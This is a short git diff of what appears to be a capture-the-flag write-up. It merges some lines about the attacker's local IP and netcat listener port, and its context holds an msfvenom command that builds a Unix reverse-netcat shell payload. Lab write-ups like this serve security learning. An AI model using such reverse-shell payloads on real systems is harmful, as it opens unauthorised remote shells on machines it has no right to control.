@@ -68,9 +68,7 @@ password = password
 
 ### 4 Create a payload using: 
 
-[ ! ] Reminder, LOCALIP depends on your own machine, I will be using 10.10.0.0 as an example! 
-[ ! ] In this situation, we can use port 8888. We can use another port number such as 1234 as long as the netcat listener 
-is also set to 1234
+[ ! ] Reminder, LOCALIP depends on your own machine, I will be using 10.10.0.0 as an example! In this situation, we can use port 8888. We can use another port number such as 1234 as long as the netcat listener is also set to 1234
 
 - msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
 ![1](https://user-images.githubusercontent.com/69840849/90489384-8f08bf00-e180-11ea-9dcc-e3927b6bf169.png)
